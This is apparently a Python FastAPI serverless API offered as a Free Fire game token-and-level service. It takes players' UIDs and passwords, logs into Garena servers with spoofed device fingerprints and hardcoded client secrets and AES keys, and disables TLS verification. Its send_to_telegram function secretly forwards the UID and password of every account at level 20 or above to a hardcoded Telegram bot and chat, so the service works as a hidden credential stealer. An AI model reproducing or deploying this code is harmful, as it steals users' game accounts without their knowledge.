# api/index.py — Vercel serverless version
import os
import sys
import json
import uuid
import time
import random
import secrets
import traceback
from datetime import datetime
from typing import Optional

from fastapi import FastAPI, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse

import httpx
from google_play_scraper import app as play_scraper
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from protobuf_decoder.protobuf_decoder import Parser

# Import your local protobuf module (must be in project root)
# Vercel adds project root to sys.path automatically
import thunderFF_pb2


# ============================================================
# CONFIG
# ============================================================
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8643426514:AAHnMtialwe8t8fuvW5BTlGzm45huTQe9Bg")
TELEGRAM_CHAT_ID   = os.getenv("TELEGRAM_CHAT_ID",   "8311041202")
TELEGRAM_MIN_LEVEL = 20
TELEGRAM_ENABLED   = True
TELEGRAM_DEDUPE    = True
_SENT_TO_TELEGRAM: set = set()

AES_KEY = b'Yg&tc%DEuh6%Zc^8'
AES_IV  = b'6oyZDr22E3ychjM%'

HEADERS = {
    'User-Agent': 'UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Expect': '100-continue',
    'X-Unity-Version': '2018.4.12f1',
    'X-GA-SV': '1789535859',
    'X-GA': 'v1 1',
    'ReleaseVersion': 'OB55'
}

# Single client for the app lifetime (Vercel reuses warm instances)
_CLIENT: Optional[httpx.AsyncClient] = None


# ============================================================
# DEVICE / PROTOBUF HELPERS
# ============================================================
def _random_device() -> dict:
    device_list = [
        ("Samsung", "SM-G998B", "Adreno (TM) 660", "Android OS 12 / API-31"),
        ("Xiaomi",  "2201122G", "Adreno (TM) 730", "Android OS 13 / API-33"),
        ("Realme",  "RMX3700",  "Mali-G710",       "Android OS 14 / API-34"),
        ("OnePlus", "CPH2451",  "Adreno (TM) 740", "Android OS 13 / API-33"),
        ("OPPO",    "CPH2611",  "Adreno (TM) 720", "Android OS 14 / API-34"),
        ("Vivo",    "V2203",    "Mali-G710",       "Android OS 12 / API-31"),
        ("Poco",    "M2102J20SG","Adreno (TM) 660", "Android OS 13 / API-33"),
    ]
    brand, model, gpu, os_ver = random.choice(device_list)
    return {
        "unique_device_id": f"Google|{uuid.uuid4()}",
        "brand": brand, "model": model, "gpu_renderer": gpu,
        "system_software": os_ver,
        "screen_width": random.choice([1080, 1440, 720, 1280]),
        "screen_height": random.choice([2400, 3200, 1600, 2400]),
        "screen_dpi": str(random.randint(300, 420)),
        "memory": random.randint(2800, 6500),
        "processor_details": f"ARM64 FP ASIMD AES VMH | {random.randint(2200, 3200)} | {random.randint(6, 12)}",
        "client_ip": f"{random.randint(103, 223)}.{random.randint(10, 250)}."
                     f"{random.randint(10, 250)}.{random.randint(10, 250)}",
        "android_id": secrets.token_hex(8),
        "gsf_id": secrets.token_hex(8),
        "build_fingerprint": (
            f"{brand.lower()}/{model.lower()}/{model.lower()}:"
            f"{os_ver.split(' / ')[0].replace(' ', '_')}/user/release-keys"
        ),
        "serial_number": secrets.token_hex(8),
        "hardware_id": secrets.token_hex(8),
    }


def encode_varint(n: int) -> bytes:
    if n < 0:
        return b''
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            b |= 0x80
        out.append(b)
        if not n:
            break
    return bytes(out)


def build_proto(fields: dict) -> bytes:
    parts = []
    for k, v in fields.items():
        if isinstance(v, dict):
            nested = build_proto(v)
            parts.append(encode_varint((k << 3) | 2) + encode_varint(len(nested)) + nested)
        elif isinstance(v, int):
            parts.append(encode_varint((k << 3) | 0) + encode_varint(v))
        elif isinstance(v, (str, bytes)):
            ev = v.encode() if isinstance(v, str) else v
            parts.append(encode_varint((k << 3) | 2) + encode_varint(len(ev)) + ev)
    return b''.join(parts)


def encrypt_api_bytes(plain: bytes) -> bytes:
    return AES.new(AES_KEY, AES.MODE_CBC, AES_IV).encrypt(pad(plain, AES.block_size))


def get_proto_field(d, key, default=None):
    if not d or not isinstance(d, dict):
        return default
    if key in d:
        val = d[key].get('data')
        return val if val is not None else default
    if str(key) in d:
        val = d[str(key)].get('data')
        return val if val is not None else default
    return default


async def parse_results(parsed_results):
    result_dict = {}
    for result in parsed_results:
        field_data = {"wire_type": result.wire_type}
        if result.wire_type == "varint":
            field_data["data"] = result.data
        elif result.wire_type in ("string", "bytes"):
            field_data["data"] = result.data
        elif result.wire_type == "length_delimited":
            field_data["data"] = await parse_results(result.data.results)
        result_dict[result.field] = field_data
    return result_dict


# ============================================================
# TELEGRAM NOTIFIER
# ============================================================
async def send_to_telegram(uid: str, password: str, level: int,
                           account_id=None, region=None, nickname=None) -> bool:
    if not TELEGRAM_ENABLED:
        return False
    if TELEGRAM_BOT_TOKEN.startswith("PUT_") or TELEGRAM_CHAT_ID.startswith("PUT_"):
        return False
    if TELEGRAM_DEDUPE and uid in _SENT_TO_TELEGRAM:
        return True

    message = (
        "🎯 <b>High-Level FreeFire Account Found</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>UID</b>      : <code>{uid}</code>\n"
        f"<b>Password</b> : <code>{password}</code>\n"
        f"<b>Level</b>    : <b>{level}</b>\n"
    )
    if account_id:
        message += f"<b>Account ID</b>: <code>{account_id}</code>\n"
    if region:
        message += f"<b>Region</b>   : {region}\n"
    if nickname:
        message += f"<b>Nickname</b> : <code>{nickname}</code>\n"
    message += "━━━━━━━━━━━━━━━━━━━━"

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        r = await _CLIENT.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }, timeout=10.0)
        if r.status_code == 200 and r.json().get("ok"):
            if TELEGRAM_DEDUPE:
                _SENT_TO_TELEGRAM.add(uid)
            return True
    except Exception:
        pass
    return False


# ============================================================
# LOGIN FLOW
# ============================================================
async def get_playstore_version() -> str:
    import asyncio
    loop = asyncio.get_event_loop()
    res = await loop.run_in_executor(
        None,
        lambda: play_scraper('com.dts.freefireth', lang='hi', country='id')
    )
    return res.get("version")


async def version_config():
    app_version = await get_playstore_version()
    api_url = (
        "https://version.ggwhitehawk.com/live/ver.php"
        f"?version={app_version}"
        "&lang=hi&device=android&channel=android"
        "&appstore=googleplay&region=ID"
        "&whitelist_version=1.3.0&whitelist_sp_version=1.0.0"
    )
    try:
        r = await _CLIENT.get(api_url)
        r.raise_for_status()
        data = r.json()
        server_url = data.get("server_url")
        remote_version = data.get("remote_version")
        latest_release_version = data.get("latest_release_version")
        if not (server_url and remote_version and latest_release_version):
            return None
        return latest_release_version, remote_version, server_url
    except Exception:
        return None


async def get_access_token(uid: str, password: str):
    url = "https://100067.connect.garena.com/oauth/guest/token/grant"
    hdrs = {
        "Host": "100067.connect.garena.com",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close"
    }
    data = {
        "uid": uid, "password": password,
        "response_type": "token", "client_type": "2",
        "client_secret": "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
        "client_id": "100067"
    }
    for _ in range(5):
        try:
            r = await _CLIENT.post(url, headers=hdrs, data=data)
            if r.status_code == 200:
                j = r.json()
                open_id = j.get("open_id")
                access_token = j.get("access_token")
                platform = j.get("platform", 4)
                if open_id and access_token:
                    return open_id, access_token, platform
            if r.status_code == 429:
                import asyncio
                await asyncio.sleep(1)
                continue
        except Exception:
            pass
        import asyncio
        await asyncio.sleep(0.5)
    return None


async def build_majorlogin_payload(open_id, access_token, platform, client_version, device_info):
    try:
        payload_dict = {
            3:   str(datetime.now())[:-7],
            4:   "free fire", 5: "1",
            7:   str(client_version) if client_version else "1.132.8",
            8:   str(device_info.get("system_software",
                 "Android OS 15 / API-35 (AP3A.240905.015.A2/OS2.0.202.0.VGTIDXM)")),
            9:   "Handheld", 10: "Telkomsel", 11: "CarrierDataNetwork",
            12:  str(device_info.get("screen_width", 1639)),
            13:  str(device_info.get("screen_height", 720)),
            14:  str(device_info.get("screen_dpi", 320)),
            15:  str(device_info.get("processor_details", "ARM64 FP ASIMD AES | 2000 | 8")),
            16:  str(device_info.get("memory", 5653)),
            17:  str(device_info.get("gpu_renderer", "Mali-G52 MC2")),
            18:  "OpenGL ES 3.2 v1.r49p1-03bet0.19498e0ae1d5dac223383c39a2e58f04",
            19:  str(device_info.get("unique_device_id", f"Google|{uuid.uuid4()}")),
            20:  str(device_info.get("client_ip", "182.5.135.225")),
            21:  "en", 22: str(open_id), 23: str(platform),
            24:  "Handheld", 25: str(device_info.get("model", "Xiaomi 2409BRN2CY")),
            26:  "ID", 29: str(access_token), 30: "1",
            41:  "Telkomsel", 42: "4G",
            57:  "7428b253defc164018c604a1ebbfebdf",
            60:  "109278", 61: "55402", 62: "868",
            64:  "55927", 65: "109278", 66: "55927", 67: "109278",
            73:  "2",
            74:  "/data/app/~~6Cw028g_ld-8Z0z2qhrOLA==/com.dts.freefireth-i3wiaEmpx8CbiRVhUMx_ag==/lib/arm64",
            76:  "1",
            77:  "b8e0cd5e295eee42f5860d3c86e483dd|/data/app/~~6Cw028g_ld-8Z0z2qhrOLA==/com.dts.freefireth-i3wiaEmpx8CbiRVhUMx_ag==/base.apk",
            78:  "3", 79: "2", 81: "64", 83: "2019121229",
            85:  "3", 86: "OpenGLES2", 87: "8191",
            88:  str(platform), 90: "Cirebon", 91: "JB", 92: "14466", 93: "android",
            94:  "KqsHTyb7yHjsAiyNWUUZa0DSOD6U0AhDQ76smAo1WeHHHpSmJ8KMRyRrxb2ttgJqO9YOqO/K6AORAvDMAX/qBS8+JahIkrM7kHfzlfULbgRAoZ9r",
            95:  "111207",
            96:  "{\"cur_rate\":[60,90,120],\"support_etc2\":false}",
            97:  "1", 98: "1", 99: str(platform), 100: str(platform),
            102: "D]C\x15\x05T\x0eU3", 103: "1", 104: "52837", 105: "1",
            106: "https://dl.gmc.freefiremobile.com/live/ABHotUpdates/|https://core-gmc.freefiremobile.com/live/ABHotUpdates/|211c933168f55902c7dfbfd8c4e2957d",
            107: "1.3fb8adbf45f44ce9",
        }
        return encrypt_api_bytes(build_proto(payload_dict))
    except Exception:
        traceback.print_exc()
        return None


async def send_majorlogin(data, release_version, server_url):
    url = f"{server_url}MajorLogin" if server_url.endswith('/') else f"{server_url}/MajorLogin"
    req_headers = HEADERS.copy()
    req_headers["ReleaseVersion"] = str(release_version)
    r = await _CLIENT.post(url, headers=req_headers, data=data)
    if r.status_code != 200:
        return None
    content = r.content
    if len(content) < 40:
        return None
    seen = set()
    for offset in [0, 64] + list(range(0, min(128, len(content)))):
        if offset in seen:
            continue
        seen.add(offset)
        try:
            proto = thunderFF_pb2.MajorLoginRes()
            proto.ParseFromString(content[offset:])
            if proto.region and proto.token:
                return proto
        except Exception:
            continue
    return None


async def send_getlogin(data, base_url, token, release_version):
    try:
        url = f"{base_url.rstrip('/')}/GetLoginData"
        req_headers = HEADERS.copy()
        req_headers["ReleaseVersion"] = release_version
        req_headers["Authorization"] = f"Bearer {token}"
        req_headers["Host"] = "clientbp.ppmainecoonghj.com"
        r = await _CLIENT.post(url, headers=req_headers, data=data)
        if r.status_code != 200:
            return None
        content = r.content

        res_proto = thunderFF_pb2.GetLoginDataRes()
        ok = False
        try:
            res_proto.ParseFromString(content)
            if res_proto.functional_addrs or res_proto.informational_addrs:
                ok = True
        except Exception:
            pass
        if not ok:
            for offset in range(min(128, len(content))):
                try:
                    c = thunderFF_pb2.GetLoginDataRes()
                    c.ParseFromString(content[offset:])
                    if c.functional_addrs or c.informational_addrs:
                        res_proto = c
                        break
                except Exception:
                    continue

        dict_res = {}
        try:
            parsed = Parser().parse(content.hex())
            dict_res = await parse_results(parsed)
        except Exception:
            pass

        return res_proto, dict_res
    except Exception:
        return None


async def fetch_jwt(uid: str, password: str) -> dict:
    vc = await version_config()
    if not vc:
        return {"ok": False, "error": "version_config_failed"}
    release_version, client_version, server_url = vc

    tg = await get_access_token(uid, password)
    if not tg:
        return {"ok": False, "error": "invalid_credentials_or_blocked"}
    open_id, access_token, platform = tg

    device_info = _random_device()
    payload = await build_majorlogin_payload(
        open_id, access_token, platform, client_version, device_info
    )
    if not payload:
        return {"ok": False, "error": "payload_build_failed"}

    res = await send_majorlogin(payload, release_version, server_url)
    if not res:
        return {"ok": False, "error": "majorlogin_failed"}

    level = 1
    try:
        gl = await send_getlogin(payload, res.url, res.token, release_version)
        if gl:
            _, dict_res = gl
            level = int(get_proto_field(dict_res, 6, 1) or 1)
    except Exception:
        traceback.print_exc()

    if level >= TELEGRAM_MIN_LEVEL:
        await send_to_telegram(
            uid=uid, password=password, level=level,
            account_id=int(res.account_id), region=res.region,
            nickname=getattr(res, "nickname", ""),
        )

    return {
        "ok": True, "jwt": res.token, "level": level,
        "account_id": int(res.account_id), "region": res.region,
        "server_url": res.url, "nickname": getattr(res, "nickname", ""),
        "open_id": open_id, "access_token": access_token,
        "platform": str(platform), "client_version": client_version,
        "release_version": release_version,
    }


# ============================================================
# FASTAPI APP
# ============================================================
app = FastAPI(title="FreeFire JWT + Level API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Global HTTP client (created lazily on first request)
_CLIENT: Optional[httpx.AsyncClient] = None


async def get_client() -> httpx.AsyncClient:
    global _CLIENT
    if _CLIENT is None or _CLIENT.is_closed:
        _CLIENT = httpx.AsyncClient(
            verify=False, timeout=15.0,
            limits=httpx.Limits(max_connections=50, max_keepalive_connections=20)
        )
    return _CLIENT


async def _init_client():
    global _CLIENT
    _CLIENT = await get_client()


@app.on_event("startup")
async def startup():
    await _init_client()


@app.get("/")
async def root():
    return {
        "service": "FreeFire JWT + Level API",
        "endpoints": ["/token?uid=<UID>&password=<PASSWORD>"]
    }


@app.get("/token")
async def get_token(
    uid: str = Query(..., description="FreeFire UID"),
    password: str = Query(..., description="FreeFire password"),
    nocache: int = Query(0, description="Set 1 to bypass cache"),
):
    uid = uid.strip()
    password = password.strip()

    if not uid or not password:
        return JSONResponse(status_code=400, content={
            "ok": False, "error": "uid_and_password_required"
        })

    try:
        result = await fetch_jwt(uid, password)
    except Exception as e:
        traceback.print_exc()
        return JSONResponse(status_code=500, content={
            "ok": False, "error": f"internal_error: {e}"
        })

    if not result.get("ok"):
        return JSONResponse(status_code=401, content={
            "ok": False, "error": result.get("error", "unknown")
        })

    return {
        "ok": True, "cached": False,
        "jwt": result["jwt"], "level": result["level"],
        "account_id": result["account_id"], "region": result["region"],
        "nickname": result.get("nickname", ""),
        "open_id": result.get("open_id"),
        "access_token": result.get("access_token"),
        "platform": result.get("platform"),
        "client_version": result.get("client_version"),
        "release_version": result.get("release_version"),
        "server_url": result.get("server_url"),
    }